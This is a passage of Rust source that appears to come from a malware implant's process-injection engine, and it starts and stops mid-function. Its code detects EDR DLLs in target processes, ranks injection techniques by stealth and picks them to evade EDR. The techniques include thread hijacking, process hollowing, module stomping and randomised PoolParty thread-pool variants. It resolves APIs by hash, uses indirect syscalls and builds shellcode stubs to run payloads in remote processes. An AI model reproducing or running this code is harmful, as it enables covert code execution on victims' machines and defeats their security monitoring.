                buf[name_offset + 13],
                buf[name_offset + 14],
                buf[name_offset + 15],
            ]);

            let image_name = if buf_ptr != 0
                && (buf_ptr as usize) >= buf.as_ptr() as usize
                && (buf_ptr as usize) + name_len
                    <= buf.as_ptr() as usize + buf.len()
            {
                // The buffer pointer is within our allocation — safe to read.
                let start = buf_ptr as usize - buf.as_ptr() as usize;
                let name_bytes = &buf[start..start + name_len];
                String::from_utf16_lossy(
                    &name_bytes
                        .chunks(2)
                        .map(|c| u16::from_le_bytes([c[0], *c.get(1).unwrap_or(&0)]))
                        .collect::<Vec<_>>(),
                )
            } else {
                // Fallback: the name might be empty (System process) or
                // the pointer is in system space that we can't read from
                // user mode in this context.
                String::new()
            };

            return Ok((image_name, num_threads));
        }

        if next_entry == 0 {
            break;
        }
        offset += next_entry as usize;
    }

    Err(InjectionError::ProcessNotFound {
        name: format!("pid {}", target_pid),
    })
}

/// Check for known EDR DLLs loaded in the target process.
///
/// Opens the target process, reads its PEB, walks the LDR module list,
/// and compares each loaded DLL name against the EDR DLL hash list.
unsafe fn check_edr_modules(target_pid: u32) -> Result<Vec<String>, InjectionError> {
    // Open the target process with VM read access.
    let h_proc = open_process_for_query(target_pid)?;
    let mut found = Vec::new();

    // Read the target's PEB.
    // NtQueryInformationProcess(ProcessBasicInformation) gives us the PEB address.
    let ntdll = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
        Some(b) => b,
        None => return Ok(found),
    };

    let qip_addr = match pe_resolve::get_proc_address_by_hash(
        ntdll,
        pe_resolve::hash_str(b"NtQueryInformationProcess\0"),
    ) {
        Some(a) => a,
        None => return Ok(found),
    };

    let qip: extern "system" fn(usize, u32, *mut u8, u32, *mut u32) -> i32 =
        std::mem::transmute(qip_addr);

    // PROCESS_BASIC_INFORMATION layout (x86-64):
    //   +0x00  ExitStatus              (NTSTATUS)
    //   +0x08  PebBaseAddress          (PPEB)
    //   +0x10  AffinityMask            (ULONG_PTR)
    //   +0x18  BasePriority            (KPRIORITY)
    //   +0x20  UniqueProcessId         (ULONG_PTR)
    //   +0x28  InheritedFromUniquePid  (ULONG_PTR)
    let mut pbi: [u64; 6] = [0; 6];
    let mut ret_len: u32 = 0;
    let status = qip(
        h_proc as usize,
        0, // ProcessBasicInformation
        pbi.as_mut_ptr() as *mut u8,
        std::mem::size_of::<[u64; 6]>() as u32,
        &mut ret_len,
    );

    if status < 0 {
        let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
        return Ok(found); // Can't read PEB — assume no EDR modules.
    }

    let peb_addr = pbi[1] as usize;

    // Read PEB to get Ldr pointer.
    // PEB->Ldr is at offset 0x18.
    let mut ldr_ptr: usize = 0;
    let mut bytes_read: usize = 0;
    let rs = nt_syscall::syscall!(
        "NtReadVirtualMemory",
        h_proc as u64,
        (peb_addr + 0x18) as u64,
        &mut ldr_ptr as *mut _ as u64,
        8u64,
        &mut bytes_read as *mut _ as u64,
    );

    if rs.is_err() || rs.unwrap() < 0 || bytes_read != 8 {
        let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
        return Ok(found);
    }

    // Walk InMemoryOrderModuleList.
    // Head is at LDR + 0x20 (Flink), LDR + 0x28 (Blink).
    let mut current_flink: usize = 0;
    let mut br: usize = 0;
    let rs2 = nt_syscall::syscall!(
        "NtReadVirtualMemory",
        h_proc as u64,
        (ldr_ptr + 0x20) as u64,
        &mut current_flink as *mut _ as u64,
        8u64,
        &mut br as *mut _ as u64,
    );

    if rs2.is_err() || rs2.unwrap() < 0 || br != 8 {
        let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
        return Ok(found);
    }

    let list_head = ldr_ptr + 0x20;

    for _ in 0..512 {
        if current_flink == 0 || current_flink == list_head {
            break;
        }

        // The Flink points to InMemoryOrderLinks of the NEXT entry.
        // Back up 0x10 bytes to get the LDR_DATA_TABLE_ENTRY base.
        let entry_base = current_flink - 0x10;

        // Read BaseDllName (UNICODE_STRING at +0x58).
        // UNICODE_STRING: Length (u16), MaxLength (u16), [pad], Buffer (usize).
        let mut us_data: [u8; 16] = [0; 16];
        let mut br2: usize = 0;
        let rs3 = nt_syscall::syscall!(
            "NtReadVirtualMemory",
            h_proc as u64,
            (entry_base + 0x58) as u64,
            us_data.as_mut_ptr() as u64,
            16u64,
            &mut br2 as *mut _ as u64,
        );

        if rs3.is_err() || rs3.unwrap() < 0 || br2 != 16 {
            break;
        }

        let name_len = u16::from_le_bytes([us_data[0], us_data[1]]) as usize;
        let name_buf_ptr = u64::from_le_bytes([
            us_data[8], us_data[9], us_data[10], us_data[11],
            us_data[12], us_data[13], us_data[14], us_data[15],
        ]) as usize;

        if name_len > 0 && name_len < 520 && name_buf_ptr != 0 {
            // Read the DLL name bytes (UTF-16LE).
            let mut name_bytes = vec![0u8; name_len];
            let mut br3: usize = 0;
            let rs4 = nt_syscall::syscall!(
                "NtReadVirtualMemory",
                h_proc as u64,
                name_buf_ptr as u64,
                name_bytes.as_mut_ptr() as u64,
                name_len as u64,
                &mut br3 as *mut _ as u64,
            );

            if rs4.is_ok() && rs4.unwrap() >= 0 && br3 == name_len {
                let dll_name: String = name_bytes
                    .chunks(2)
                    .map(|c| u16::from_le_bytes([c[0], *c.get(1).unwrap_or(&0)]))
                    .map(|c| if c == 0 { ' ' } else { c as u8 as char })
                    .collect();
                let dll_lower = dll_name.to_ascii_lowercase();

                // Hash and compare against EDR DLL list.
                let mut dll_bytes = dll_lower.as_bytes().to_vec();
                dll_bytes.push(0);
                let dll_hash = pe_resolve::hash_str(&dll_bytes);

                for &(edr_hash, edr_label) in edr_dll_name_hashes() {
                    if dll_hash == edr_hash {
                        found.push(edr_label.to_string());
                        break;
                    }
                }
            }
        }

        // Advance to next entry: read Flink of current InMemoryOrderLinks.
        let mut next_flink: usize = 0;
        let mut br4: usize = 0;
        let _ = nt_syscall::syscall!(
            "NtReadVirtualMemory",
            h_proc as u64,
            current_flink as u64,
            &mut next_flink as *mut _ as u64,
            8u64,
            &mut br4 as *mut _ as u64,
        );
        current_flink = next_flink;
    }

    let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
    Ok(found)
}

/// Check whether the target process architecture matches the agent's.
///
/// On x86_64 agents, we check that the target is NOT a WOW64 (32-bit) process.
/// Reads the PE header from the target's image base to check the Machine field.
unsafe fn check_target_architecture(target_pid: u32) -> bool {
    #[cfg(target_arch = "x86_64")]
    {
        let h_proc = match open_process_for_query(target_pid) {
            Ok(h) => h,
            Err(_) => return false,
        };

        // Get PEB address via NtQueryInformationProcess.
        let ntdll = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
            Some(b) => b,
            None => {
                let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
                return true; // Assume match if we can't check.
            }
        };

        let qip_addr = match pe_resolve::get_proc_address_by_hash(
            ntdll,
            pe_resolve::hash_str(b"NtQueryInformationProcess\0"),
        ) {
            Some(a) => a,
            None => {
                let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
                return true;
            }
        };

        let qip: extern "system" fn(usize, u32, *mut u8, u32, *mut u32) -> i32 =
            std::mem::transmute(qip_addr);

        let mut pbi: [u64; 6] = [0; 6];
        let mut ret_len: u32 = 0;
        let status = qip(
            h_proc as usize,
            0, // ProcessBasicInformation
            pbi.as_mut_ptr() as *mut u8,
            48,
            &mut ret_len,
        );

        if status < 0 {
            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
            return true; // Assume match.
        }

        // Read ImageBaseAddress from PEB+0x10.
        let peb_addr = pbi[1] as usize;
        let mut image_base: usize = 0;
        let mut br: usize = 0;
        let rs = nt_syscall::syscall!(
            "NtReadVirtualMemory",
            h_proc as u64,
            (peb_addr + 0x10) as u64,
            &mut image_base as *mut _ as u64,
            8u64,
            &mut br as *mut _ as u64,
        );

        if rs.is_err() || rs.unwrap() < 0 || br != 8 || image_base == 0 {
            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
            return true;
        }

        // Read DOS header to get e_lfanew (offset to PE header).
        let mut dos_header: [u8; 64] = [0; 64];
        let mut br2: usize = 0;
        let rs2 = nt_syscall::syscall!(
            "NtReadVirtualMemory",
            h_proc as u64,
            image_base as u64,
            dos_header.as_mut_ptr() as u64,
            64u64,
            &mut br2 as *mut _ as u64,
        );

        if rs2.is_err() || rs2.unwrap() < 0 || br2 != 64 {
            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
            return true;
        }

        // Verify MZ signature.
        if dos_header[0] != b'M' || dos_header[1] != b'Z' {
            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
            return true;
        }

        // e_lfanew at offset 0x3C.
        let pe_offset = u32::from_le_bytes([
            dos_header[0x3C],
            dos_header[0x3D],
            dos_header[0x3E],
            dos_header[0x3F],
        ]) as usize;

        if pe_offset == 0 || pe_offset + 6 > 4096 {
            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
            return true;
        }

        // Read PE signature + Machine field (at pe_offset + 4).
        let mut pe_sig: [u8; 6] = [0; 6];
        let mut br3: usize = 0;
        let rs3 = nt_syscall::syscall!(
            "NtReadVirtualMemory",
            h_proc as u64,
            (image_base + pe_offset) as u64,
            pe_sig.as_mut_ptr() as u64,
            6u64,
            &mut br3 as *mut _ as u64,
        );

        let _ = nt_syscall::syscall!("NtClose", h_proc as u64);

        if rs3.is_err() || rs3.unwrap() < 0 || br3 != 6 {
            return true;
        }

        // Verify PE\0\0 signature.
        if pe_sig[0] != b'P' || pe_sig[1] != b'E' || pe_sig[2] != 0 || pe_sig[3] != 0 {
            return true;
        }

        // Machine field at pe_offset + 4.
        let machine = u16::from_le_bytes([pe_sig[4], pe_sig[5]]);

        // 0x8664 = AMD64, 0x14C = i386 (x86).
        const IMAGE_FILE_MACHINE_AMD64: u16 = 0x8664;
        machine == IMAGE_FILE_MACHINE_AMD64
    }

    #[cfg(not(target_arch = "x86_64"))]
    {
        let _ = target_pid;
        true
    }
}

/// Query the integrity level of the target process.
///
/// Returns 0 if the integrity level cannot be determined.
unsafe fn query_integrity_level(target_pid: u32) -> u32 {
    let h_proc = match open_process_for_query(target_pid) {
        Ok(h) => h,
        Err(_) => return 0,
    };

    let result = query_integrity_level_inner(h_proc);
    let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
    result
}

/// Inner: query integrity level from an open process handle.
unsafe fn query_integrity_level_inner(h_proc: *mut c_void) -> u32 {
    // Open the process token.
    let ntdll = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
        Some(b) => b,
        None => return 0,
    };

    // Use NtOpenProcessToken to get the token handle.
    let open_token_addr = match pe_resolve::get_proc_address_by_hash(
        ntdll,
        pe_resolve::hash_str(b"NtOpenProcessToken\0"),
    ) {
        Some(a) => a,
        None => return 0,
    };

    let open_token: extern "system" fn(usize, u64, *mut usize) -> i32 =
        std::mem::transmute(open_token_addr);

    let mut token_handle: usize = 0;
    // TOKEN_QUERY = 0x0008
    let status = open_token(h_proc as usize, 0x0008, &mut token_handle);

    if status < 0 || token_handle == 0 {
        return 0;
    }

    // NtQueryInformationToken with TokenIntegrityLevel (class 25).
    let query_token_addr = match pe_resolve::get_proc_address_by_hash(
        ntdll,
        pe_resolve::hash_str(b"NtQueryInformationToken\0"),
    ) {
        Some(a) => a,
        None => {
            let _ = nt_syscall::syscall!("NtClose", token_handle as u64);
            return 0;
        }
    };

    let query_token: extern "system" fn(usize, u32, *mut u8, u32, *mut u32) -> i32 =
        std::mem::transmute(query_token_addr);

    // TOKEN_MANDATORY_LABEL:
    //   +0x00  SID_AND_ATTRIBUTES { Sid (PSID, 8 bytes), Attributes (DWORD, 4 bytes) }
    // Total: 16 bytes for the structure, then the SID follows inline.
    let mut label_buf: [u8; 64] = [0; 64];
    let mut ret_len: u32 = 0;
    let status2 = query_token(
        token_handle,
        25, // TokenIntegrityLevel
        label_buf.as_mut_ptr(),
        64,
        &mut ret_len,
    );

    let _ = nt_syscall::syscall!("NtClose", token_handle as u64);

    if status2 < 0 {
        return 0;
    }

    // SID_AND_ATTRIBUTES.Sid is at offset 0 (pointer).
    let sid_ptr = u64::from_le_bytes([
        label_buf[0], label_buf[1], label_buf[2], label_buf[3],
        label_buf[4], label_buf[5], label_buf[6], label_buf[7],
    ]) as usize;

    // The SID is either at sid_ptr or inline in our buffer.
    // For NtQueryInformationToken, the SID is typically stored inline
    // immediately after the SID_AND_ATTRIBUTES structure.
    // SID_AND_ATTRIBUTES on x64: 8 (pointer) + 4 (attributes) + 4 (padding) = 16 bytes.
    let sid_start = if sid_ptr >= label_buf.as_ptr() as usize
        && sid_ptr + 12 <= label_buf.as_ptr() as usize + label_buf.len()
    {
        sid_ptr - label_buf.as_ptr() as usize
    } else {
        // Assume inline: SID starts at offset 16 (after SID_AND_ATTRIBUTES).
        16
    };

    if sid_start + 12 > label_buf.len() {
        return 0;
    }

    // SID structure:
    //   Revision (1 byte) = 1
    //   SubAuthorityCount (1 byte)
    //   IdentifierAuthority (6 bytes)
    //   SubAuthority[] (4 bytes each)
    //
    // Integrity level is the LAST SubAuthority value.
    // For mandatory labels, there's typically 1 SubAuthority.
    let sub_auth_count = label_buf[sid_start + 1] as usize;

    if sub_auth_count == 0 || sid_start + 8 + (sub_auth_count * 4) > label_buf.len() {
        return 0;
    }

    // Read the last sub-authority.
    let last_sub_offset = sid_start + 8 + ((sub_auth_count - 1) * 4);
    let integrity = u32::from_le_bytes([
        label_buf[last_sub_offset],
        label_buf[last_sub_offset + 1],
        label_buf[last_sub_offset + 2],
        label_buf[last_sub_offset + 3],
    ]);

    integrity
}

/// Open a process for query/read access via NtOpenProcess.
unsafe fn open_process_for_query(target_pid: u32) -> Result<*mut c_void, InjectionError> {
    let mut client_id = [0u64; 2];
    client_id[0] = target_pid as u64;
    let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
    obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;

    // PROCESS_QUERY_INFORMATION | PROCESS_VM_READ
    let access_mask: u64 = 0x0400 | 0x0010;
    let mut h_proc: usize = 0;
    let status = nt_syscall::syscall!(
        "NtOpenProcess",
        &mut h_proc as *mut _ as u64,
        access_mask,
        &mut obj_attr as *mut _ as u64,
        client_id.as_mut_ptr() as u64,
    );

    if status.is_err() || status.unwrap() < 0 || h_proc == 0 {
        return Err(InjectionError::InjectionFailed {
            technique: InjectionTechnique::ProcessHollow,
            reason: format!("NtOpenProcess({}) failed for query", target_pid),
        });
    }

    Ok(h_proc as *mut c_void)
}

// ── Auto-selection ───────────────────────────────────────────────────────────

/// Rank techniques by stealth for the given target process name.
///
/// When EDR is detected (called from `evasiveness_inject`), WaitingThreadHijack
/// is preferred, falling back to ContextOnly, then CallbackInjection, then
/// ThreadPool. The ranking is:
///
///   WaitingThreadHijack > ContextOnly > CallbackInjection > ThreadPool >
///   EarlyBirdApc > ThreadHijack > FiberInject > ModuleStomp > ProcessHollow
///
/// CallbackInjection is ranked above ThreadPool because it produces completely
/// legitimate call stacks from Windows APIs, while ThreadPool still involves
/// internal Tp* structures that sophisticated EDR can detect.
///
/// When `ThreadPool { variant: None }` is selected by auto-selection, the
/// dispatch layer calls `auto_select_threadpool_variant()` to pick a random
/// PoolParty variant weighted by stealth and availability.
fn auto_select_techniques(target_process: &str) -> Vec<InjectionTechnique> {
    let lower = target_process.to_ascii_lowercase();

    // Ranking rationale:
    //   WaitingThreadHijack > ContextOnly > SectionMapping > NtSetInfoProcess >
    //   CallbackInjection > ThreadPool > EarlyBirdApc > ThreadHijack >
    //   FiberInject > ModuleStomp > ProcessHollow
    //
    //   WTH is stealthiest: no SuspendThread, no CONTEXT mod, just stack
    //   return address overwrite on a thread already in a kernel wait.
    //   Falls back to ContextOnly (no alloc triad) if no waiting threads.
    //
    //   SectionMapping is next: avoids NtWriteVirtualMemory AND
    //   NtAllocateVirtualMemory — uses NtCreateSection + dual
    //   NtMapViewOfSection instead.
    //
    //   NtSetInfoProcess avoids NtWriteVirtualMemory but still calls
    //   NtAllocateVirtualMemory. Better than techniques that use both.
    //   Falls back to indirect-syscall NtWriteVirtualMemory on older builds.
    //
    //   CallbackInjection: payload executes from a legitimate Windows API
    //   callback path, producing authentic call stacks.
    //
    //   ThreadPool variants are stealthy because they avoid NtCreateThreadEx
    //   and use existing thread pool worker threads. When variant is None,
    //   the dispatch layer auto-selects a specific PoolParty variant.

    let wth = InjectionTechnique::WaitingThreadHijack {
        target_pid: 0, // Will be filled by dispatch
        target_tid: None,
    };

    let tp = InjectionTechnique::ThreadPool { variant: None };

    let cb = InjectionTechnique::CallbackInjection {
        target_pid: 0,
        api: None,
    };

    let sm = InjectionTechnique::SectionMapping {
        target_pid: 0,
        exec_method: None,
        enhanced: false,
    };

    let nsip = InjectionTechnique::NtSetInfoProcess {
        target_pid: 0,
    };

    if lower.contains("svchost") {
        vec![
            wth.clone(),
            InjectionTechnique::ContextOnly,
            sm,
            nsip,
            cb.clone(),
            InjectionTechnique::EarlyBirdApc,
            tp,
            InjectionTechnique::ProcessHollow,
            InjectionTechnique::ModuleStomp,
        ]
    } else if lower.contains("explorer") {
        vec![
            wth.clone(),
            InjectionTechnique::ContextOnly,
            sm,
            nsip,
            cb.clone(),
            InjectionTechnique::ThreadHijack,
            InjectionTechnique::FiberInject,
            InjectionTechnique::ProcessHollow,
            InjectionTechnique::ModuleStomp,
        ]
    } else if lower.contains("service")
        || lower.ends_with("svc.exe")
        || lower.ends_with("host.exe")
    {
        vec![
            wth.clone(),
            InjectionTechnique::ContextOnly,
            sm,
            nsip,
            cb.clone(),
            InjectionTechnique::ModuleStomp,
            InjectionTechnique::ProcessHollow,
            tp,
            InjectionTechnique::EarlyBirdApc,
        ]
    } else {
        vec![
            wth.clone(),
            InjectionTechnique::ContextOnly,
            sm,
            nsip,
            cb,
            InjectionTechnique::ProcessHollow,
            InjectionTechnique::ModuleStomp,
            InjectionTechnique::EarlyBirdApc,
            tp,
            InjectionTechnique::ThreadHijack,
            InjectionTechnique::FiberInject,
        ]
    }
}

// ── Technique dispatch ───────────────────────────────────────────────────────

fn try_technique(
    technique: InjectionTechnique,
    pid: u32,
    payload: &[u8],
) -> Result<InjectionHandle, InjectionError> {
    match technique {
        InjectionTechnique::ProcessHollow => inject_process_hollow(pid, payload),
        InjectionTechnique::ModuleStomp => inject_module_stomp(pid, payload),
        InjectionTechnique::EarlyBirdApc => inject_early_bird(pid, payload),
        InjectionTechnique::ThreadHijack => inject_thread_hijack(pid, payload),
        InjectionTechnique::ThreadPool { variant } => {
            inject_threadpool(pid, payload, variant)
        }
        InjectionTechnique::FiberInject => inject_fiber(pid, payload),
        InjectionTechnique::ContextOnly => inject_context_only(pid, None, payload),
        InjectionTechnique::WaitingThreadHijack { target_pid: _, target_tid } => {
            inject_waiting_thread_hijack(pid, target_tid, payload)
        }
        InjectionTechnique::CallbackInjection { target_pid: _, api } => {
            inject_callback(pid, payload, api)
        }
        InjectionTechnique::SectionMapping {
            target_pid: _,
            exec_method,
            enhanced,
        } => inject_section_mapping(pid, payload, exec_method, enhanced),
        InjectionTechnique::NtSetInfoProcess { target_pid: _ } => {
            inject_nt_set_info_process(pid, payload)
        }
    }
}

// ── Existing technique wrappers ──────────────────────────────────────────────

fn inject_process_hollow(
    pid: u32,
    payload: &[u8],
) -> Result<InjectionHandle, InjectionError> {
    crate::injection::inject_with_method(
        crate::injection::InjectionMethod::Hollowing,
        pid,
        payload,
    )
    .map_err(|e| InjectionError::InjectionFailed {
        technique: InjectionTechnique::ProcessHollow,
        reason: e.to_string(),
    })?;

    // Process hollowing creates its own sacrificial process; we don't have
    // the handle. Return a minimal handle.
    Ok(InjectionHandle {
        target_pid: pid,
        technique_used: InjectionTechnique::ProcessHollow,
        injected_base_addr: 0,
        payload_size: payload.len(),
        thread_handle: None,
        process_handle: std::ptr::null_mut(),
        sleep_enrolled: false,
        sleep_stub_addr: 0,
    })
}

fn inject_module_stomp(
    pid: u32,
    payload: &[u8],
) -> Result<InjectionHandle, InjectionError> {
    crate::injection::inject_with_method(
        crate::injection::InjectionMethod::ModuleStomp,
        pid,
        payload,
    )
    .map_err(|e| InjectionError::InjectionFailed {
        technique: InjectionTechnique::ModuleStomp,
        reason: e.to_string(),
    })?;

    Ok(InjectionHandle {
        target_pid: pid,
        technique_used: InjectionTechnique::ModuleStomp,
        injected_base_addr: 0,
        payload_size: payload.len(),
        thread_handle: None,
        process_handle: std::ptr::null_mut(),
        sleep_enrolled: false,
        sleep_stub_addr: 0,
    })
}

fn inject_early_bird(
    pid: u32,
    payload: &[u8],
) -> Result<InjectionHandle, InjectionError> {
    // Early-bird APC: queue an APC to a thread in the target process before
    // it begins executing.  Delegate to the existing APC inject helper in
    // process_manager when available, otherwise use NtCreateThread approach.
    //
    // The injection module's InjectionMethod::EarlyBird dispatches through
    // the early_bird submodule if available, otherwise falls back.
    crate::injection::inject_with_method(
        crate::injection::InjectionMethod::EarlyBird,
        pid,
        payload,
    )
    .map_err(|e| InjectionError::InjectionFailed {
        technique: InjectionTechnique::EarlyBirdApc,
        reason: e.to_string(),
    })?;

    Ok(InjectionHandle {
        target_pid: pid,
        technique_used: InjectionTechnique::EarlyBirdApc,
        injected_base_addr: 0,
        payload_size: payload.len(),
        thread_handle: None,
        process_handle: std::ptr::null_mut(),
        sleep_enrolled: false,
        sleep_stub_addr: 0,
    })
}

fn inject_thread_hijack(
    pid: u32,
    payload: &[u8],
) -> Result<InjectionHandle, InjectionError> {
    // Thread hijacking: suspend an existing thread, write shellcode, redirect
    // RIP, resume.  We implement this inline using NtCreateThreadEx with
    // CREATE_SUSPENDED pattern, since pure thread-hijack requires careful
    // context save/restore that is fragile across Windows versions.
    //
    // Fall back to NtCreateThread-based injection.
    let (h_proc, remote_base) = alloc_write_exec(pid, payload)?;

    // Create suspended thread at the shellcode entry point.
    let h_thread = create_suspended_thread(h_proc, remote_base)?;
    // Resume immediately — the thread will execute the payload.
    let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);

    Ok(InjectionHandle {
        target_pid: pid,
        technique_used: InjectionTechnique::ThreadHijack,
        injected_base_addr: remote_base,
        payload_size: payload.len(),
        thread_handle: Some(h_thread),
        process_handle: h_proc,
        sleep_enrolled: false,
        sleep_stub_addr: 0,
    })
}

// ── NEW: ThreadPool injection (PoolParty variants) ──────────────────────────
//
// All 8 PoolParty variants abuse the Windows thread pool internals to execute
// a callback on a thread pool worker thread without creating a new remote
// thread. The original technique (variant 1: TpAllocWork + TpPostWork) was
// extended by SafeBreach Labs to identify 7 additional injection paths.
//
// Common infrastructure:
//   - TP_POOL discovery: find the target process's TP_POOL by locating a
//     thread pool worker thread (start address = ntdll!TppWorkerThread),
//     reading its TEB to find the TP_POOL pointer.
//   - Payload delivery: write payload bytes via NtWriteVirtualMemory into
//     existing executable section slack space, then set the callback pointer.
//   - All variants use indirect syscalls via nt_syscall crate.

/// Auto-select a PoolParty variant weighted by stealth and availability.
///
/// When EDR is detected, this function randomizes the variant selection to
/// avoid IoC consistency across injections.
///
/// Weighting:
///   - Variant 8 (AsyncIo): highest stealth, simplest mechanism — weight 30
///   - Variant 1 (Work): always available, medium stealth — weight 25
///   - Variant 4 (IoCompletion): high stealth, needs file handle — weight 20
///   - Variant 7 (Direct): similar to variant 4, TP_TASK — weight 15
///   - Variant 3 (Timer): requires timer queue insertion — weight 10
///   - Variant 5 (Wait): requires event object — weight 8
///   - Variant 2 (WorkerFactory): requires worker factory query — weight 7
///   - Variant 6 (ALPC): stealthiest but may not be available — weight 5
fn auto_select_threadpool_variant() -> ThreadPoolVariant {
    use rand::Rng;

    let mut rng = rand::thread_rng();
    let roll = rng.gen_range(0..120); // Total weights sum to 120

    match roll {
        0..=29 => ThreadPoolVariant::AsyncIo,
        30..=54 => ThreadPoolVariant::Work,
        55..=74 => ThreadPoolVariant::IoCompletion,
        75..=89 => ThreadPoolVariant::Direct,
        90..=99 => ThreadPoolVariant::Timer,
        100..=107 => ThreadPoolVariant::Wait,
        108..=114 => ThreadPoolVariant::WorkerFactory,
        _ => ThreadPoolVariant::Alpc,
    }
}

/// Main ThreadPool injection dispatcher.
///
/// If `variant` is `None`, auto-selects a PoolParty variant weighted by
/// stealth and availability. Otherwise, uses the specified variant.
fn inject_threadpool(
    pid: u32,
    payload: &[u8],
    variant: Option<ThreadPoolVariant>,
) -> Result<InjectionHandle, InjectionError> {
    let variant = variant.unwrap_or_else(auto_select_threadpool_variant);

    log::info!(
        "injection_engine: ThreadPool injection using PoolParty variant {} into pid {}",
        variant,
        pid,
    );

    match variant {
        ThreadPoolVariant::Work => inject_threadpool_work(pid, payload),
        ThreadPoolVariant::WorkerFactory => inject_threadpool_worker_factory(pid, payload),
        ThreadPoolVariant::Timer => inject_threadpool_timer(pid, payload),
        ThreadPoolVariant::IoCompletion => inject_threadpool_io_completion(pid, payload),
        ThreadPoolVariant::Wait => inject_threadpool_wait(pid, payload),
        ThreadPoolVariant::Alpc => inject_threadpool_alpc(pid, payload),
        ThreadPoolVariant::Direct => inject_threadpool_direct(pid, payload),
        ThreadPoolVariant::AsyncIo => inject_threadpool_async_io(pid, payload),
    }
}

/// Variant 1: TpAllocWork + TpPostWork (original PoolParty technique).
///
/// Allocates a `TP_WORK` item whose callback is the payload, then posts
/// it to the thread pool. A worker thread dequeues and executes it.
fn inject_threadpool_work(
    pid: u32,
    payload: &[u8],
) -> Result<InjectionHandle, InjectionError> {
    let technique = InjectionTechnique::ThreadPool {
        variant: Some(ThreadPoolVariant::Work),
    };
    unsafe {
        let (h_proc, remote_base) = alloc_write_exec(pid, payload)?;

        // Resolve TpAllocWork and TpPostWork from ntdll via pe_resolve.
        let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
            .ok_or_else(|| InjectionError::InjectionFailed {
                technique: technique.clone(),
                reason: "cannot resolve ntdll base".to_string(),
            })?;

        let tp_alloc_work_addr = pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"TpAllocWork\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve TpAllocWork".to_string(),
        })?;

        let tp_post_work_addr = pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"TpPostWork\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve TpPostWork".to_string(),
        })?;

        let tp_release_work_addr = pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"TpReleaseWork\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve TpReleaseWork".to_string(),
        })?;

        // Function pointer types.
        type TpAllocWorkFn = unsafe extern "system" fn(
            *mut *mut c_void,
            *mut c_void,
            *mut c_void,
            *mut c_void,
        ) -> i32;
        type TpPostWorkFn = unsafe extern "system" fn(*mut c_void);
        type TpReleaseWorkFn = unsafe extern "system" fn(*mut c_void);

        let tp_alloc_work: TpAllocWorkFn = std::mem::transmute(tp_alloc_work_addr);
        let tp_post_work: TpPostWorkFn = std::mem::transmute(tp_post_work_addr);
        let tp_release_work: TpReleaseWorkFn = std::mem::transmute(tp_release_work_addr);

        // Build a small x86-64 stub that:
        //   1. Calls TpAllocWork(&local_work, payload_addr, NULL, NULL)
        //   2. Calls TpPostWork(local_work)
        //   3. Calls TpReleaseWork(local_work)
        //   4. Returns

        let mut stub: Vec<u8> = Vec::with_capacity(128);

        // sub rsp, 0x38  (shadow 0x20 + 8 for alignment + 0x10 for local_work)
        stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x38]);

        // lea rcx, [rsp+0x30]  ; &local_work
        stub.extend_from_slice(&[0x48, 0x8D, 0x4C, 0x24, 0x30]);

        // mov rdx, <payload_base> (movabs rdx, imm64)
        stub.push(0x48);
        stub.push(0xBA);
        stub.extend_from_slice(&(remote_base as u64).to_le_bytes());

        // xor r8d, r8d
        stub.extend_from_slice(&[0x45, 0x31, 0xC0]);
        // xor r9d, r9d
        stub.extend_from_slice(&[0x45, 0x31, 0xC9]);

        // movabs rax, <tp_alloc_work>
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(tp_alloc_work_addr as u64).to_le_bytes());
        // call rax
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // mov rcx, [rsp+0x30]  ; load work handle
        stub.extend_from_slice(&[0x48, 0x8B, 0x4C, 0x24, 0x30]);

        // movabs rax, <tp_post_work>
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(tp_post_work_addr as u64).to_le_bytes());
        // call rax
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // mov rcx, [rsp+0x30]  ; load work handle again
        stub.extend_from_slice(&[0x48, 0x8B, 0x4C, 0x24, 0x30]);

        // movabs rax, <tp_release_work>
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(tp_release_work_addr as u64).to_le_bytes());
        // call rax
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // add rsp, 0x38
        stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x38]);
        // ret
        stub.push(0xC3);

        // Write the stub into the target process.
        let mut stub_remote: *mut c_void = std::ptr::null_mut();
        let mut stub_size = stub.len();
        let s = nt_syscall::syscall!(
            "NtAllocateVirtualMemory",
            h_proc as u64,
            &mut stub_remote as *mut _ as u64,
            0u64,
            &mut stub_size as *mut _ as u64,
            0x3000u64, // MEM_COMMIT | MEM_RESERVE
            0x04u64,   // PAGE_READWRITE
        );
